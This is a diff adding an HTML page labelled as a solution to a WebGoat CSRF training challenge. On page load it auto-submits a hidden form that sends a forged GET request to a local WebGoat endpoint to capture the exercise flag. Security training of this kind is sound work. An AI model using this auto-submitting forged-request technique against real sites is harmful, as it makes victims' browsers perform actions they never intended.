@@ -1,0 +1,9 @@
+<!-- WebGoat CSRF Chellange 3 solution-->
+<html>
+	<body onload="document.getElementById('xsrf').submit();">
+		<form id="xsrf" method="GET" action="http://localhost:8080/WebGoat/csrf/basic-get-flag">
+			<input name="csrf" type="hidden" value="true">
+			<input type="submit" name="submitbtn">
+		</form>
+	</body>
+</html>
